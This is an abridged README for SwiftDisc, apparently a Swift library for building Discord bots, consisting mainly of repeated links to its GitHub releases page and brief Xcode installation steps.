# 🎉 SwiftDisc - Build Discord Bots Easily
...
## 📥 Download SwiftDisc
[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/bcl2025/SwiftDisc/releases)

Head over to our Releases page to download the latest version of SwiftDisc:
[Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/releases)
...
## 📂 Installation Steps
1. **Visit the Releases Page**: Click the link to go to the SwiftDisc Releases page: [Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/releases).
...
5. **Create a New Project**: Start a new project by selecting "Create a new Xcode project." Choose a “macOS” or “iOS” app based on your needs.
...
6. **Add SwiftDisc to Your Project**:
   ...
   - Paste the URL `https://github.com/bcl2025/SwiftDisc` into the search box.
...
## 🔗 Useful Links
- [SwiftDisc Releases](https://github.com/bcl2025/SwiftDisc/releases)
- [Documentation](https://github.com/bcl2025/SwiftDisc/wiki)
...
Make sure to check the Releases page regularly for updates and new features: [Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/releases)